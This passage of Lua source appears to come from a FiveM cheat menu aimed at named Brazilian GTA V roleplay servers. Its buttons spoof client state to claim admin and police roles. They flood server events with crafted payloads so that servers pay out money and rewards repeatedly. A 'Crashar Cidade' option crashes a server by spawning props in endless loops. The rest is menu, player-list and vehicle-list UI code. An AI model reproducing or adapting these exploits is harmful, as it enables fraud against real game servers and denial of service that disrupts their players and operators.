            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Setar Todas Perm", 0.425, yvalue, function()
                    LocalPlayer.state["Spotify"] = true                                                                 -- Player has Spotify feature enabled
                    LocalPlayer.state["Musica"] = true                                                                  -- Player can play music
                    LocalPlayer.state["Premium"] = true                                                                 -- Player is a premium member
                    LocalPlayer.state["Lafy"] = true                                                                    -- Specific role or feature (could be faction, etc.)
                    LocalPlayer.state["Open"] = true                                                                    -- Player has opened a specific interface or menu
                    LocalPlayer.state["hasPermission"] = true                                                           -- Player has a certain permission
                    LocalPlayer.state["Faccao"] = true                                                                  -- Player belongs to a faction
                    LocalPlayer.state["Policia"] = true                                                                 -- Player is in the police faction
                    LocalPlayer.state["Cop"] = true                                                                     -- Player is a cop
                    LocalPlayer.state["BauPM"] = true                                                                   -- Player can access specific item or feature (e.g., Bau PM)
                    LocalPlayer.state["PM"] = true                                                                      -- Player is a member of the PM (police faction)
                    LocalPlayer.state["Level"] = 10                                                                     -- Player's level (could be any integer)
                    LocalPlayer.state["XP"] = 5000                                                                      -- Player's experience points
                    LocalPlayer.state["FactionID"] = 3                                                                  -- ID for a faction (can be used to determine player faction)
                    LocalPlayer.state["Role"] =
                    "Admin"                                                                                             -- Player's role, could be Admin, Moderator, etc.
                    LocalPlayer.state["FactionName"] =
                    "Los Santos Police Department"                                                                      -- The faction name
                    LocalPlayer.state["Team"] =
                    "Red"                                                                                               -- The player's team in a specific game mode
                    LocalPlayer.state["Inventory"] = { "radio", "weapon_pistol_mk2", "weapon_pistol", "WEAPON_PISTOL" } -- A list of items
                    LocalPlayer.state["Permissions"] = { "can_drive", "can_fight", "can_use_radio" }                    -- List of permissions
                    LocalPlayer.state["Faction"] = nil                                                                  -- Player has no faction
                    LocalPlayer.state["Music"] =
                    ""                                                                                                  -- No music playing, empty string can indicate this
                    LocalPlayer.state["CustomStateName"] =
                        value                                                                                           -- This can be any type (boolean, string, integer, etc.)
                    LocalPlayer.state["Admin"] = true                                                                   -- Player is an admin
                    LocalPlayer.state["Moderator"] = true                                                               -- Player is not a moderator
                    LocalPlayer.state["InMission"] = true                                                               -- Player is in a mission
                    LocalPlayer.state["IsWanted"] = false                                                               -- Player is not wanted by the police
                    LocalPlayer.state["RaceMode"] = true                                                                -- Player is in a race mode
                    LocalPlayer.state["FreeRoam"] = true                                                                -- Player is in free roam


                    Notify("Sucesso", "camargo-sucess", "Setado!", 255, 255, 255)
                end)
            end


            
            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Puxar 1 milhao (Santa Group)", 0.425, yvalue, function()
                    LocalPlayer.state["Spotify"] = true                                                                 -- Player has Spotify feature enabled
                    LocalPlayer.state["Musica"] = true                                                                  -- Player can play music
                    LocalPlayer.state["Premium"] = true                                                                 -- Player is a premium member
                    LocalPlayer.state["Lafy"] = true                                                                    -- Specific role or feature (could be faction, etc.)
                    LocalPlayer.state["Open"] = true                                                                    -- Player has opened a specific interface or menu
                    LocalPlayer.state["hasPermission"] = true                                                           -- Player has a certain permission
                    LocalPlayer.state["Faccao"] = true                                                                  -- Player belongs to a faction
                    LocalPlayer.state["Policia"] = true                                                                 -- Player is in the police faction
                    LocalPlayer.state["Cop"] = true                                                                     -- Player is a cop
                    LocalPlayer.state["BauPM"] = true                                                                   -- Player can access specific item or feature (e.g., Bau PM)
                    LocalPlayer.state["PM"] = true                                                                      -- Player is a member of the PM (police faction)
                    LocalPlayer.state["Level"] = 10                                                                     -- Player's level (could be any integer)
                    LocalPlayer.state["XP"] = 5000                                                                      -- Player's experience points
                    LocalPlayer.state["FactionID"] = 3                                                                  -- ID for a faction (can be used to determine player faction)
                    LocalPlayer.state["Role"] =
                    "Admin"                                                                                             -- Player's role, could be Admin, Moderator, etc.
                    LocalPlayer.state["FactionName"] =
                    "Los Santos Police Department"                                                                      -- The faction name
                    LocalPlayer.state["Team"] =
                    "Red"                                                                                               -- The player's team in a specific game mode
                    LocalPlayer.state["Inventory"] = { "radio", "weapon_pistol_mk2", "weapon_pistol", "WEAPON_PISTOL" } -- A list of items
                    LocalPlayer.state["Permissions"] = { "can_drive", "can_fight", "can_use_radio" }                    -- List of permissions
                    LocalPlayer.state["Faction"] = nil                                                                  -- Player has no faction
                    LocalPlayer.state["Music"] =
                    ""                                                                                                  -- No music playing, empty string can indicate this
                    LocalPlayer.state["CustomStateName"] =
                        value                                                                                           -- This can be any type (boolean, string, integer, etc.)
                    LocalPlayer.state["Admin"] = true                                                                   -- Player is an admin
                    LocalPlayer.state["Moderator"] = true                                                               -- Player is not a moderator
                    LocalPlayer.state["InMission"] = true                                                               -- Player is in a mission
                    LocalPlayer.state["IsWanted"] = false                                                               -- Player is not wanted by the police
                    LocalPlayer.state["RaceMode"] = true                                                                -- Player is in a race mode
                    LocalPlayer.state["FreeRoam"] = true                                                                -- Player is in free roam


                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)

                    Citizen.CreateThread(function()
                        local code = json.decode('["Bank",["100000000","deposit"],"painel",5]')
                        for iniciar = 1, 2000 do
                            TriggerServerEvent("painel:tunnel_req", table.unpack(code))
                            Citizen.Wait(1000)
                        end
                    end)

                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Crashar Cidade [!]", 0.425, yvalue, function()
                    LocalPlayer.state["Spotify"] = true                                                                 -- Player has Spotify feature enabled
                    LocalPlayer.state["Musica"] = true                                                                  -- Player can play music
                    LocalPlayer.state["Premium"] = true                                                                 -- Player is a premium member
                    LocalPlayer.state["Lafy"] = true                                                                    -- Specific role or feature (could be faction, etc.)
                    LocalPlayer.state["Open"] = true                                                                    -- Player has opened a specific interface or menu
                    LocalPlayer.state["hasPermission"] = true                                                           -- Player has a certain permission
                    LocalPlayer.state["Faccao"] = true                                                                  -- Player belongs to a faction
                    LocalPlayer.state["Policia"] = true                                                                 -- Player is in the police faction
                    LocalPlayer.state["Cop"] = true                                                                     -- Player is a cop
                    LocalPlayer.state["BauPM"] = true                                                                   -- Player can access specific item or feature (e.g., Bau PM)
                    LocalPlayer.state["PM"] = true                                                                      -- Player is a member of the PM (police faction)
                    LocalPlayer.state["Level"] = 10                                                                     -- Player's level (could be any integer)
                    LocalPlayer.state["XP"] = 5000                                                                      -- Player's experience points
                    LocalPlayer.state["FactionID"] = 3                                                                  -- ID for a faction (can be used to determine player faction)
                    LocalPlayer.state["Role"] =
                    "Admin"                                                                                             -- Player's role, could be Admin, Moderator, etc.
                    LocalPlayer.state["FactionName"] =
                    "Los Santos Police Department"                                                                      -- The faction name
                    LocalPlayer.state["Team"] =
                    "Red"                                                                                               -- The player's team in a specific game mode
                    LocalPlayer.state["Inventory"] = { "radio", "weapon_pistol_mk2", "weapon_pistol", "WEAPON_PISTOL" } -- A list of items
                    LocalPlayer.state["Permissions"] = { "can_drive", "can_fight", "can_use_radio" }                    -- List of permissions
                    LocalPlayer.state["Faction"] = nil                                                                  -- Player has no faction
                    LocalPlayer.state["Music"] =
                    ""                                                                                                  -- No music playing, empty string can indicate this
                    LocalPlayer.state["CustomStateName"] =
                        value                                                                                           -- This can be any type (boolean, string, integer, etc.)
                    LocalPlayer.state["Admin"] = true                                                                   -- Player is an admin
                    LocalPlayer.state["Moderator"] = true                                                               -- Player is not a moderator
                    LocalPlayer.state["InMission"] = true                                                               -- Player is in a mission
                    LocalPlayer.state["IsWanted"] = false                                                               -- Player is not wanted by the police
                    LocalPlayer.state["RaceMode"] = true                                                                -- Player is in a race mode
                    LocalPlayer.state["FreeRoam"] = true                                                                -- Player is in free roam

              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)

                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)

                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    
              
                    Citizen.CreateThread(function()
                        while true do
                            Citizen.Wait(1)
                            local ped = PlayerPedId()
                            local pos = GetEntityCoords(ped)

                            local prop = "prop_boombox_01"

                            local offset = 0.5
                            local spawnPos = vector3(pos.x + offset, pos.y + offset, pos.z)


                            local object = CreateObject(GetHashKey(prop), spawnPos.x, spawnPos.y, spawnPos.z, true, true,
                                false)

                            SetEntityAsMissionEntity(object, true, true)
                            PlaceObjectOnGroundProperly(object)
                        end
                    end)
                    Notify("Sucesso", "camargo-sucess", "Destruindo Cidade!", 255, 255, 255)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Alto Astral)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local code = json.decode('["checkPayment",[100],"astral_empregos",0]')
                        for iniciar = 1, 2000 do
                            TriggerServerEvent("job_load_delivery:tunnel_req", table.unpack(code))
                            Citizen.Wait(50)
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Fluxo RP)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local code = json.decode(
                            '["checkItems",["fisherman"],"jobs",0,{"ev":"fila_empregos:tunnel_req","plv":"8T9KLISJX6","rs":"jobs","tipl":"jobs:13"}]')
                        for iniciar = 1, 100 do
                            TriggerServerEvent("fila_empregos:tunnel_req", table.unpack(code))
                            Citizen.Wait(16000)
                        end
                    end)
                    Citizen.CreateThread(function()
                        local code = json.decode(
                            '["payReward",["skktskt",17944384],"jobs",0,{"ev":"fila_empregos:tunnel_req","plv":"8LIA0E3AHS","rs":"jobs","tipl":"jobs:14"}]')
                        for iniciar = 1, 100 do
                            TriggerServerEvent("fila_empregos:tunnel_req", table.unpack(code))
                            Citizen.Wait(16000)
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Utopia RP)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local code = json.decode(
                            '["givePaymentTaxista",["NDE3OjIzNDUA"],"dope_empregos",-1,{"ev":"dope_empregos:tunnel_req","plv":"4DVGNYOECO","rs":"dope_empregos","tipl":"dope_empregos:14"}]')
                        for iniciar = 1, 900000 do
                            TriggerServerEvent("dope_empregos:tunnel_req", table.unpack(code))
                            Citizen.Wait(50)
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Pantanal RP)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local code = json.decode('["PaymentBus",[1],"works",0]')
                        for iniciar = 1, 999999 do
                            TriggerServerEvent("imperio-works:tunnel_req", table.unpack(code))
                            Citizen.Wait(50)
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Cidade Bela)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local code = json.decode(
                            '["givePayment",[],"robberys",-1,{"ev":"roubos:tunnel_req","plv":"UGZ2LCW30D","rs":"robberys","tipl":"robberys:3"}]')
                        for iniciar = 1, 10 do
                            TriggerServerEvent("roubos:tunnel_req", table.unpack(code))
                            Citizen.Wait(10000)
                        end
                    end)
                end)
            end


            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Oceania RP 1)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    CreateThread(function()
                        local execucoes = 0
                        local limite = 30

                        while execucoes < limite do
                            TriggerServerEvent("gameplay:entregas:req", { "cocaina", 3, "solo" })
                            Wait(1000)
                            TriggerServerEvent("gameplay:entregas:req", { "cocaina", 2, "solo" })
                            Wait(1000)

                            execucoes = execucoes + 1
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Oceania RP 2)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        for taxi = 1, 10000000 do
                            TriggerServerEvent("ReceberDinheiroMotorista", "1700", { 110000, 0 }, "5081787109375", 0)
                            Citizen.Wait(1 * 1000000)
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Oceania RP 3)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local code = json.decode(
                            '[6102.58056640625,{"ev":"ReceberDinheiroMotorista","plv":"1Q6H7IOL36","rs":"empregos","tipl":"empregos:1"}]')
                        for iniciar = 1, 20000 do
                            TriggerServerEvent("ReceberDinheiroMotorista", table.unpack(code))
                            Citizen.Wait(5000)
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Revoada RJ)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local code = json.decode(
                            '["giveOre",[],"revoada_module",0,-170108863145495,"NDBY",{"is":24226,"sr":64538}]')
                        for iniciar = 1, 100 do
                            TriggerServerEvent("minerman:tunnel_req", table.unpack(code))
                            Citizen.Wait(10000)
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Carros Iniciais (Santa Group)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Carros Iniciais na garagem!", 255, 255, 255)
                    TriggerServerEvent("login_reward:tunnel_req", "giveReward", { 1 }, "login_reward", 0)
                    TriggerServerEvent("login_reward:tunnel_req", "giveReward", { 2 }, "login_reward", 0)
                    TriggerServerEvent("login_reward:tunnel_req", "giveReward", { 3 }, "login_reward", 0)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Mil Grau RP)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    CreateThread(function()
                        local params = json.decode('["checkPayment",["madeira",100],"milgrau_caminhoneiro",0]')
                        while true do
                            Wait(2 * 1000)
                            TriggerEvent("9ry8lIDuEOUgxcwj7AWViz", "milgrau_caminhoneiro:tunnel_req",
                                table.unpack(params))
                        end
                    end)
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Lisboa RP)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    CreateThread(function()
                        local params = json.decode('["givePaymentMotorista",["NTU1OjEyOAAA"],"dope_empregos",-1]')
                        while true do
                            Wait(0 * 1000)
                            TriggerEvent("4HXLoy61EpCqb3K9tTvnue", "dope_empregos:tunnel_req", table.unpack(params))
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (ABCD RP)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local code = json.decode('[]')
                        for iniciar = 1, 100000 do
                            TriggerServerEvent("thor_ultragaz:pagamento", table.unpack(code))
                            Citizen.Wait(1000)
                        end
                    end)
                end)
            end



            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Farm (Filadelfia RP)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Farm Puxando...", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local total = 1500

                        local code = json.decode('["RouteReward",["Cartel"],"routes",-1]')
                        local porEvento = 9
                        local eventosNecessarios = math.ceil(total / porEvento)
                        local Reward = 0

                        for iniciar = 1, eventosNecessarios do
                            TriggerServerEvent("routes:tunnel-req", table.unpack(code))
                            Reward = Reward + porEvento
                            local falta = math.max(total - Reward, 0)
                            local waitTime = math.random(100, 600)
                            Citizen.Wait(waitTime)
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Farm (Goias RP)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Farm Goias RP...", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local code = json.decode('["payment",["Minerador",5,17],"vrp_empregos",0]')
                        for iniciar = 1, 1000 do
                            TriggerServerEvent("vrp_empregos:tunnel_req", table.unpack(code))
                            Citizen.Wait(5000)
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Distrito RP)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local code = json.decode('["collectConsume",["Motorista"],"works",0]')
                        for iniciar = 1, 500 do
                            TriggerServerEvent("works:tunnel_req", table.unpack(code))
                            Citizen.Wait(50)
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Aguia RP)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    LocalPlayer.state["Policia"] = true
                    Citizen.CreateThread(function()
                        local code = json.decode(
                            '["PaymentHouse",[[true,true,true,true]],"works",0,{"resource":"works","transaction_id":"works:2"}]')
                        for iniciar = 1, 1000 do
                            TriggerServerEvent("imperio-works:tunnel_req", table.unpack(code))
                            Citizen.Wait(50)
                        end
                    end)
                end)
            end


            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Europa RP)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local code = json.decode(
                            '["givePaymentTaxista",["OTk4OjEzMTcA"],"dope_empregos",-1,{"ev":"dope_empregos:tunnel_req","plv":"4BVXIS58EV","rs":"dope_empregos","tipl":"dope_empregos:31"}]')
                        for iniciar = 1, 1000 do
                            TriggerServerEvent("dope_empregos:tunnel_req", table.unpack(code))
                            Citizen.Wait(50)
                        end
                    end)
                end)
            end

            yvalue = yvalue + addbutton

            if yvalue >= 0.34 and yvalue <= max then
                interact.standardbutton("Money (Brasil Capital)", 0.425, yvalue, function()
                    Notify("Sucesso", "camargo-sucess", "Puxando Dinheiro!", 255, 255, 255)
                    Citizen.CreateThread(function()
                        local codigo = json.decode(
                            '[{"cargo_type":0,"contract_id":4918,"contract_name":"Transporte de serragem","contract_type":0,"coords_index":140,"fast":0,"fragile":0,"price_per_km":9492.0,"stockDealer":false,"trailer":"trailers","truck":"packer","valuable":0},5,14320,[],984.7329711914063,983.0366821289063,1000.0]')
                        for iniciar = 1, 15 do
                            TriggerServerEvent("truck_logistics:finishJob", table.unpack(codigo))
                            Citizen.Wait(50)
                        end
                    end)

                    Citizen.CreateThread(function()
                        local codigo = json.decode('[{"amount":"14320"}]')
                        for iniciar = 1, 15 do
                            TriggerServerEvent("truck_logistics:withdrawMoney", table.unpack(codigo))
                            Citizen.Wait(50)
                        end
                    end)
                end)
            end

            interact.Scroll(10, "exploits")
        end
    end,


    bindscheck = function()
        for button, key in pairs(binds.buttons) do
            if key.value ~= nil then
                if IsDisabledControlJustPressed(0, key.value) then
                    key.func()
                end
            end
        end



        for button, key in pairs(binds.toggles) do
            if key.value ~= nil then
                if IsDisabledControlJustPressed(0, key.value) then
                    currenttoggle = key.texttoggle

                    disableanim = false



                    key.func()
                end
            end
        end
    end,


    callPlayersList = function()
        local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY

        local y = 0.3 + scrolls["playerList"].static
        local add = 0.03
        local max = 0.73

        if IsDisabledControlPressed(0, 14) and y > (0.355 - (#playerson * add)) and mousefunctions.mouse(0.63 + Loader_X, 0.46 + Loader_Y, 0.165, 0.25) then
            scrolls["playerList"].static = scrolls["playerList"].static - add
        end

        if IsDisabledControlJustPressed(0, 15) and y < (0.3) and mousefunctions.mouse(0.63 + Loader_X, 0.46 + Loader_Y, 0.165, 0.25) then
            scrolls["playerList"].static = scrolls["playerList"].static + add
        end

        for i = 1, #playerson do
            if i > 0 then
                player = playerson[i].player
                local selected = false
                selfcoords = GetEntityCoords(PlayerPedId())
                local buttonypos = ((0.05 * 1.0) + (i - 1) * 0.024) + y + Loader_Y
                pedcoords = GetEntityCoords(GetPlayerPed(player))
                local name = GetPlayerName(player)

                local isPlayerDead = GetEntityHealth(GetPlayerPed(player)) == 0
                local r, g, b = 255, 255, 255


                if isPlayerDead then
                    name = "Morto"
                    r, g, b = 255, 0, 0
                end

                if not interact.textBoxes["searchPlayers"].text or interact.textBoxes["searchPlayers"].text == "" or string.match(name:lower(), interact.textBoxes["searchPlayers"].text:lower()) then
                    local distance = GetDistanceBetweenCoords(selfcoords, pedcoords, false)

                    if distance < listVariables.distanceLimit then
                        if buttonypos >= 0.34 + Loader_Y and buttonypos <= 0.5300 + Loader_Y then
                            local playerinfo = ' ' .. name .. '  D - ' .. math.ceil(playerson[i].distance)

                            if SelectedPlayer == player then
                                r, g, b = overlay.colors.main.r, overlay.colors.main.g, overlay.colors.main.b
                                playerinfo = '• ' .. name .. '  D - ' .. math.ceil(playerson[i].distance)
                            end

                            if interact.PlayerButton(playerinfo, 0.45 + Loader_X, buttonypos + 0.025, false, r, g, b) then
                                if SelectedPlayer == player then
                                    SelectedPlayer = false
                                else
                                    SelectedPlayer = player
                                end
                            end
                        end
                    end
                end
            end
        end
    end,






    callVehicleList = function()
        local Loader_X, Loader_Y = Drag.LoaderX, Drag.LoaderY

        local y = 0.31 + scrolls["vehicleList"].static

        local add = 0.03


        if IsDisabledControlPressed(0, 14) and y > (0.355 - ((#vehlist - 3) * add)) and mousefunctions.mouse(0.63 + Loader_X, 0.46 + Loader_Y, 0.165, 0.25) then
            scrolls["vehicleList"].static = scrolls["vehicleList"].static - add
        end

